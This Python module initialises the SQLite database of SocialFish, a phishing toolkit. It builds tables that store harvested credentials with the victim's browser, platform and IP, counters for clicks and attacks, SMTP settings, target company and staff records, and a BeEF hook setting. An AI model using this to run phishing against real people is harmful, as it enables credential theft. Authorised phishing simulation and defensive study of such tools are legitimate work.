import os
import sqlite3
from core.genToken import genToken, genQRCode

def initDB(DATABASE):
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        cur = conn.cursor()
        create_table_sql = """ CREATE TABLE IF NOT EXISTS creds (
                                            id integer PRIMARY KEY,
                                            url text NOT NULL,
                                            jdoc text,
                                            pdate numeric,
                                            browser text,
                                            bversion text,
                                            platform text,
                                            rip text
                                        ); """
        cur.execute(create_table_sql)
        conn.commit()
        create_table_sql2 = """ CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """
        cur.execute(create_table_sql2)
        conn.commit()
        sql = ''' INSERT INTO socialfish(id,clicks,attacks,token)
                  VALUES(?,?,?,?) '''
        i = 1
        c = 0
        a = 0
        t = genToken()
        data = (i, c, a, t)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql3 = """ CREATE TABLE IF NOT EXISTS sfmail (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            smtp text,
                                            port text
                                        ); """
        cur.execute(create_table_sql3)
        conn.commit()
        sql = ''' INSERT INTO sfmail(id,email,smtp,port)
                  VALUES(?,?,?,?) '''
        i = 1
        e = ""
        s = ""
        p = ""
        data = (i, e, s, p)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql4 = """ CREATE TABLE IF NOT EXISTS professionals (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            obs text
                                        ); """
        cur.execute(create_table_sql4)
        conn.commit()
        create_table_sql5 = """ CREATE TABLE IF NOT EXISTS companies (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            phone text,
                                            address text,
                                            site text
                                        ); """
        cur.execute(create_table_sql5)
        conn.commit()
        # Configuration table for runtime settings (used by SocialFish)
        create_table_sql6 = """ CREATE TABLE IF NOT EXISTS config (
                                            id integer PRIMARY KEY,
                                            url text,
                                            red text,
                                            status text,
                                            beef text
                                        ); """
        cur.execute(create_table_sql6)
        conn.commit()
        # Insert default config row if not present
        cur.execute("SELECT COUNT(*) FROM config")
        if cur.fetchone()[0] == 0:
            cur.execute('INSERT INTO config(id, url, red, status, beef) VALUES(?, ?, ?, ?, ?)',
                        (1, 'https://github.com/UndeadSec/SocialFish', 'https://github.com/UndeadSec/SocialFish', 'custom', 'no'))
            conn.commit()
        conn.close()
        genQRCode(t)
